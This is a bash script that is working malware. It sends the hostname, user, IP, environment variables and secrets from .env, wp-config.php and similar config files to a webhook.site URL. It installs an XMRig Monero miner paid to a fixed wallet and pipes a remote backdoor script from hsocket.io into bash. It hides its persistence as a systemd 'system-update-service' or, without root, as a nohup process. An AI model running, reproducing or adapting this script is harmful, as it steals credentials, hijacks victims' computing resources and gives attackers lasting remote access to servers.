#!/bin/bash

# ==========================================
# CONFIGURATION
# ==========================================
EXFIL_URL="https://webhook.site/a8e824a9-2309-449b-91a5-9a8e0f9cbf9b"
XMR_WALLET="44fP8BsWuuo387699tZzjQbfApvMwrghidJvSJrGC7S7Fziq7GgexEML5SbA5CykJYFUb6bwvyrP2LPaRwshcfhwF58sZU7"
HSOCKET_KEY="Marsupilami666@@"
SERVICE_NAME="system-update-service"
# ==========================================

# 1. EXFILTRATION
echo "[*] Exfiltrating secrets..."
curl -X POST -d "host=$(hostname)" -d "user=$(whoami)" -d "ip=$(curl -s ifconfig.me)" "$EXFIL_URL" > /dev/null 2>&1
for file in .env .env.local config.js wp-config.php next.config.js; do
    [ -f "$file" ] && curl -X POST -d "filename=$file" -d "content=$(cat "$file")" "$EXFIL_URL" > /dev/null 2>&1
done
curl -X POST -d "filename=printenv" -d "content=$(printenv)" "$EXFIL_URL" > /dev/null 2>&1

# 2. INSTALL MINER (Robust Method)
echo "[*] Setting up Miner..."

# Bersihkan instalasi lama yang mungkin rusak
rm -rf /tmp/xmrig /tmp/xmrig.tar.gz /tmp/miner_install

# Download Versi STATIC (Penting!)
wget --no-check-certificate -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz

if [ -s /tmp/xmrig.tar.gz ]; then
    echo "[+] Download success. Extracting..."
    mkdir -p /tmp/miner_install
    tar -xf /tmp/xmrig.tar.gz -C /tmp/miner_install
    
    # Cari binary xmrig dimanapun dia berada
    MINER_BIN=$(find /tmp/miner_install -type f -name "xmrig" | head -n 1)
    
    if [ -n "$MINER_BIN" ]; then
        mv "$MINER_BIN" /tmp/xmrig
        chmod +x /tmp/xmrig
        echo "[+] Miner installed at /tmp/xmrig"
    else
        echo "[-] Failed to find xmrig binary after extraction."
    fi
else
    echo "[-] Download failed."
fi

# 3. PERSISTENCE (Systemd - Root Only)
if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
    echo "[*] Root detected. Installing Systemd Service..."
    
    SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
    
    # Stop service lama jika ada
    systemctl stop "$SERVICE_NAME" 2>/dev/null
    
    cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
# Jalankan Miner DAN Backdoor HSocket
ExecStart=/bin/bash -c '/tmp/xmrig -o pool.hashvault.pro:443 -u ${XMR_WALLET} -p x -k --tls --background; export GS_SECRET="${HSOCKET_KEY}"; curl -fsSL https://hsocket.io/8 | bash'
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"
    systemctl start "$SERVICE_NAME"
    echo "[+] Persistence installed via Systemd."

else
    # 4. FALLBACK (Non-Root)
    echo "[*] Non-root environment. Using nohup..."
    
    if [ -x /tmp/xmrig ]; then
        nohup /tmp/xmrig -o pool.hashvault.pro:443 -u "$XMR_WALLET" -p x -k --tls --background > /dev/null 2>&1 &
    fi
    
    export GS_SECRET="$HSOCKET_KEY"
    nohup bash -c "$(curl -fsSL https://hsocket.io/8)" > /dev/null 2>&1 &
fi

# Cleanup
rm -rf /tmp/xmrig.tar.gz /tmp/miner_install
echo "[+] PWNED. Check your webhook & wallet."
